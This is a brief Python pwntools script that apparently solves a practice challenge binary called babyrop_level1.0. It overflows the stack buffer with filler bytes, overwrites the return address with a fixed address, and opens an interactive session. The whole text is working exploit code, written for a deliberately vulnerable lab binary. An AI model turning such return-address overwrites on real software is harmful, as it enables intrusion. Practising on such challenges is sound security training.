from pwn import *

p = process('/challenge/babyrop_level1.0')

payload = b'a' * (0x40 + 8) + p64(0x4026F8)

p.sendlineafter(b'address).\n', payload)

p.interactive()
